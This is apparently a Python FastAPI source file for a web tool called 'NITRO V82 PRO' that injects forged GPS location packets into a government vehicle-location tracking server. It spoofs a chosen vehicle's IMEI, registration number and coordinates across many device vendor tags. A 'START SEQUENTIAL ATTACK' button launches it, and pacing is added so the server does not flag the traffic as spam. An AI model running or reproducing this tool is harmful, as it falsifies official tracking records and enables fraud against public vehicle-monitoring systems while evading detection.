import socket
import threading
import time
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- FIREBASE SETUP ---
try:
    cred = credentials.Certificate("serviceAccountKey.json")
    firebase_admin.initialize_app(cred, {'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'})
except Exception as e: print(f"FB Error: {e}")

firing = False
total_sent = 0
logs = []
TARGET_IP, TARGET_PORT = "vlts.bihar.gov.in", 9999
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

def format_coord(val):
    p = str(val).split('.')
    return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"

# --- SEQUENTIAL HANDSHAKE ENGINE ---
def start_firing(imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        for tag in TAGS:
            if not firing: break
            try:
                # 1. Establish Handshake (New Connection per Tag)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((TARGET_IP, TARGET_PORT))
                
                # 2. Prepare Valid Packet
                now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
                pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{format_coord(lat)},N,{format_coord(lon)},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\r\n"
                
                # 3. Send & Wait for Buffer Clearance
                s.sendall(bytes(pkt, 'ascii'))
                total_sent += 1
                
                # 4. Graceful Close (Completes Handshake)
                s.close()
                
                logs.append(f"[{tm}] {tag} -> HANDSHAKE_OK")
                if len(logs) > 8: logs.pop(0)
                
                # Chhota delay taaki server spam na samjhe
                time.sleep(0.5) 
            except Exception as e:
                logs.append(f"ERR: {tag} - RECONNECTING")
                time.sleep(1)

@app.get("/", response_class=HTMLResponse)
async def home():
    # UI Code remains same as before for consistency
    return """
    <html><head><title>NITRO V82 PRO</title><style>
    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .box { width:420px; border:2px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; border-radius:10px; background:rgba(0,10,0,0.9); }
    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:10px; margin:5px 0; outline:none; }
    button { width:100%; padding:12px; margin-top:10px; background:transparent; color:#0f0; border:1px solid #0f0; cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    #log { height:150px; background:#001100; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:12px; overflow:hidden; }
    </style></head><body>
    <div class="box">
        <h2>NITRO V82 PRO</h2>
        <input type="text" id="v" value="UP51T8261"><input type="text" id="i" value="358980101447242">
        <input type="text" id="lt" value="25.6501550"><input type="text" id="ln" value="84.7851780">
        <button onclick="st()">START SEQUENTIAL ATTACK</button>
        <button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button>
        <div id="log">SYSTEM READY</div>
        <div style="margin-top:10px;">SENT: <b id="c">0</b></div>
    </div>
    <script>
        let itv;
        function st() {
            fetch(`/init?v=${document.getElementById('v').value}&i=${document.getElementById('i').value}&lt=${document.getElementById('lt').value}&ln=${document.getElementById('ln').value}`);
            if(!itv) itv = setInterval(() => {
                fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText = d.c; document.getElementById('log').innerHTML = d.l.join("<br>"); });
            }, 1000);
        }
        function sp() { fetch('/stop'); clearInterval(itv); itv=null; }
    </script></body></html>
    """

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent; firing=True; total_sent=0
    threading.Thread(target=start_firing, args=(i, v.upper(), lt, ln), daemon=True).start()
    return {"ok":True}

@app.get("/stop")
def stop(): global firing; firing=False; return {"ok":True}

@app.get("/status")
def status(): return {"c": total_sent, "l": logs}
